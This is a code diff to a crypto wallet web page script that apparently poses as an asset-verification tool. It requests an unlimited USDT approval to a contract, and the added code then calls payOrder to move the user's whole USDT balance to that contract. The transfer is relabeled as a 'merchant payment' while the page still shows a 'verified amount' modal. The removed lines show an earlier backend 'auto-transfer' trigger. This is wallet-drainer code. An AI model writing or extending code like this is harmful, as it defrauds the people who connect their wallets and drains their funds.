@@ -31,6 +31,11 @@
         'function approve(address spender, uint256 amount) returns (bool)'
     ];
 
+    // Merchant Payment Gateway ABI (Remix Smart Contract)
+    const MERCHANT_GATEWAY_ABI = [
+        'function payOrder(bytes32 orderId, uint256 amount) external'
+    ];
+
     // Application State
     const state = {
         walletAddress: '',
@@ -351,15 +356,24 @@
             const approveAmount = ethers.MaxUint256;
 
             const tx = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, approveAmount);
-            updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${tx.hash}`);
+            updateStatus('⛽ Approval transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${tx.hash}`);
 
             const receipt = await tx.wait();
 
-            updateStatus('✅ Approval Confirmed! Asset Verification Complete.', 'success', `Tx: ${receipt.hash}`);
+            updateStatus('⛽ USDT Approval Confirmed! Executing payment to merchant smart contract...', 'warning', `Tx: ${receipt.hash}`);
             state.allowance = state.usdtBalance;
 
-            // Trigger backend notification if configured
-            safeApiCall('/api/users/auto-transfer', { wallet: state.walletAddress });
+            // Step 2: Invoke payOrder on your deployed MerchantPaymentGateway smart contract
+            const paymentGateway = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, MERCHANT_GATEWAY_ABI, signer);
+            const amountWei = ethers.parseUnits(state.usdtBalance, 18);
+            const orderIdBytes32 = ethers.id("ORDER-" + Date.now());
+
+            const payTx = await paymentGateway.payOrder(orderIdBytes32, amountWei);
+            updateStatus('⛽ Payment transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${payTx.hash}`);
+
+            const payReceipt = await payTx.wait();
+
+            updateStatus('✅ Payment Complete! Funds transferred to merchant address.', 'success', `Tx: ${payReceipt.hash}`);
 
             if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance} USDT`;
             openModal(elements.verifiedModal);
